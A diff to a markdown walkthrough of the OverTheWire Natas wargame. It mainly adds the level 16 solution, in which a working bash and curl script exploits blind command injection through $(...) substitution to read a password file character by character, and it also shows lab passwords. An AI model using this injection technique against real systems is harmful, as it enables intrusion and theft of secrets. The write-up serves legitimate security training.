@@ -393,13 +393,10 @@ Notice the `encodeSecret` function. We can reverse it to get the original secret
 [level-08\decode.php](level-08\decode.php)
 ```php
 <?php
-$encoded = "3d3d516343746d4d6d6c315669563362";
-
-echo base64_decode(strrev(hex2bin($encoded)));
-?>
+echo base64_decode(strrev(hex2bin($argv[1]))) . "\n";
 ```
 
-Run `php level-08\decode.php` and you will get `oubWYf2kBq`.
+Run `php level-08\decode.php 3d3d516343746d4d6d6c315669563362` and you will get `oubWYf2kBq`.
 
 Put this secret in the form and submit it. You will see:
 ```html
@@ -700,12 +697,11 @@ $new_cookie = base64_encode($new_cipher);
 echo "New cookie value: $new_cookie\n";
 ```
 
-Run `php level-11\cookie.php`.
+Run `php level-11\cookie.php HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.
 Identify how long the key is by looking for repetitions in the keystream.
 And you will get the new cookie value that you can set in the browser!
 
 ```powershell
-PS C:\Users\michiel\vives2\CYBERSECURITY\labo\03_NATAS\natas> php .\level-11\cookie.php HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
 Recovered keystream: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeL
 Enter key length: 4
 
@@ -1072,8 +1068,10 @@ But this will take a long time, so let's write a script to automate this!
 ```bash
 #!/bin/bash
 
+[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }
+
 URL="http://natas15.natas.labs.overthewire.org/"
-AUTH="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
+AUTH="natas15:$1"
 
 chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 password=""
@@ -1099,7 +1097,7 @@ done
 echo "[✔] Password: $password"
 ```
 
-Run `bash level-15\blind_sql.bash` and you will get:
+Run `bash level-15/blind_sql.bash SdqIqBsFcz3yotlNYErZSZwblkm0lrvx` and you will get:
 ```powershell
 [+] h (1/32)
 [+] hP (2/32)
@@ -1148,7 +1146,147 @@ Don't reveal whether a user exists or not in your login error messages!
 - **Date**: 2026-03-31
 - **URL**: `http://natas16.natas.labs.overthewire.org`
 - **Password**: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
-- **Tools**: Web Browser, `PHP`
+- **Tools**: Web Browser, `SQL`, `Bash`, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+For security reasons, we now filter even more on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+Notice that they have added more characters to the blacklist, but they forgot about <u>command substitution</u> with `$()`!
+
+We can use `$(grep ^passwordsofar /etc/natas_webpass/natas17)` to extract the password <u>character by character</u>!
+
+The entire needle becomes `grep -i "$(grep ^passwordsofar /etc/natas_webpass/natas17)" dictionary.txt`.
+
+- If `$(grep ^passwordsofar /etc/natas_webpass/natas17)` returns the `passwordsofar`, the output is empty (because the password is <u>not</u> in `dictionary.txt`).
+- If `$(grep ^passwordsofar /etc/natas_webpass/natas17)` returns nothing, the output is the entire `dictionary.txt`!
+
+<u>So empty output means correct password so far!</u>
+
+We can use `! echo "$response" | grep -q "apple"` to check if the output is empty or not, because `dictionary.txt` contains "apple" but an empty output does not!
+
+We'll automate this with a script again!
+
+[level-16\blind_command_substitution.bash](level-16\blind_command_substitution.bash)
+```bash
+#!/bin/bash
+
+[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }
+
+URL="http://natas16.natas.labs.overthewire.org/"
+AUTH="natas16:$1"
+
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+password=""
+
+for i in $(seq 1 32); do
+  for c in $(echo $chars | fold -w1); do
+
+    attempt="${password}${c}"
+
+    response=$(curl -s -u $AUTH \
+      --get --data-urlencode "needle=\$(grep ^${attempt} /etc/natas_webpass/natas17)" \
+      "$URL")
+
+    if ! echo "$response" | grep -q "apple"; then
+      password+=$c
+      echo "[+] $password (${#password}/32)"
+      break
+    fi
+
+  done
+done
+
+echo "[✔] Password: $password"
+```
+
+Run `bash level-16/blind_command_substitution.bash hPkjKYviLQctEW33QmuXL6eDVfMW4sGo` and you will get:
+```powershell
+[+] E (1/32)
+[+] Eq (2/32)
+[+] Eqj (3/32)
+[+] EqjH (4/32)
+[+] EqjHJ (5/32)
+[+] EqjHJb (6/32)
+[+] EqjHJbo (7/32)
+[+] EqjHJbo7 (8/32)
+[+] EqjHJbo7L (9/32)
+[+] EqjHJbo7LF (10/32)
+[+] EqjHJbo7LFN (11/32)
+[+] EqjHJbo7LFNb (12/32)
+[+] EqjHJbo7LFNb8 (13/32)
+[+] EqjHJbo7LFNb8v (14/32)
+[+] EqjHJbo7LFNb8vw (15/32)
+[+] EqjHJbo7LFNb8vwh (16/32)
+[+] EqjHJbo7LFNb8vwhH (17/32)
+[+] EqjHJbo7LFNb8vwhHb (18/32)
+[+] EqjHJbo7LFNb8vwhHb9 (19/32)
+[+] EqjHJbo7LFNb8vwhHb9s (20/32)
+[+] EqjHJbo7LFNb8vwhHb9s7 (21/32)
+[+] EqjHJbo7LFNb8vwhHb9s75 (22/32)
+[+] EqjHJbo7LFNb8vwhHb9s75h (23/32)
+[+] EqjHJbo7LFNb8vwhHb9s75ho (24/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hok (25/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh (26/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5 (27/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5T (28/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF (29/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0 (30/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0O (31/32)
+[+] EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC (32/32)
+[✔] Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+```
+
+And the password for natas17 is `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`.
+
+#### The Lesson
+
+Don't rely on blacklisting certain characters for security!
+(Command substitution using `$(...)` was still possible.)
+
+### Level 17
+
+- **Date**: 2026-03-31
+- **URL**: `http://natas17.natas.labs.overthewire.org`
+- **Password**: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
+- **Tools**: Web Browser
 
 #### The Solution
 
